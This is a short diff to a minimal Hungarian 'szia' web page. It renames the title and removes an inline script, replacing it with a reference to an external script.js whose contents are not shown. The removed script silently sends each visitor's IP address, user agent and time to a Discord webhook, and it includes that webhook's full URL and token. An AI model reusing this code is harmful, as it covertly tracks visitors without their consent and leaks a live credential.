@@ -2,7 +2,7 @@
 <html lang="hu">
 <head>
     <meta charset="UTF-8">
-    <title>ja</title>
+    <title>Szia oldal</title>
     <style>
         body {
             margin: 0;
@@ -21,25 +21,7 @@
 
 <div>szia</div>
 
-<script>
-fetch("https://api.ipify.org?format=json")
-.then(response => response.json())
-.then(data => {
-
-    fetch("https://discord.com/api/webhooks/1448724109717667942/M35Q8FhSrx1L0Eu9r0duuXsc3OpZ-1f8KuzNFRm_KJV00O-7zBjVSQ0A3kHA2zO6cbh4", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            ip: data.ip,
-            userAgent: navigator.userAgent,
-            time: new Date().toISOString()
-        })
-    });
-
-});
-</script>
+<script src="script.js"></script>
 
 </body>
 </html>
